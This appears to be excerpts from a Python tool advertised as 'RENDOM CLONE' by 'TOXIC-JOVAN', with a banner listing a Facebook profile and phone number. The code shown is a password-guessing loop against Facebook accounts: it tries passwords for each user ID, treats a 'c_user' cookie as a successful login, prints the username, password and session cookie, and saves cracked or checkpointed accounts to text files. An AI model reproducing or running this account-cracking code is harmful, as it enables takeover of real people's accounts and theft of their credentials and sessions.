...
┃ Tools    : RENDOM CLONE               ┃
┃ Owner    : TOXIC-JOVAN                ┃
┃ Facebook :     ┃https://www.facebook.com/i.love.allah.its.jovan.Ahmed 
┃ What'sapp: +8801753706851             ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")

logo1 = ("""

  _____         _               _                        
 |_   _|____  _(_) ___         | | _____   ____ _ _ __   
   | |/ _ \ \/ / |/ __|____ _  | |/ _ \ \ / / _` | '_ \  
   | | (_) >  <| | (_|_____| |_| | (_) \ V / (_| | | | | 
   |_|\___/_/\_\_|\___|     \___/ \___/ \_/ \__,_|_| |_| 
...
def fuck():
    ...
    print(' [+] OK Ids saved in Toxic-S/G/OK.txt')
    print(' [+] CP Ids saved in Toxic-S/G/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[JOVAN]--[%s/%s]--[CP%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"""\033[1;92m[Toxic-S/G-OK] ✅
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info 👇👇
                open('/sdcard/Toxic-S/G/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[Toxic-S/G-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/Toxic-S/G-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
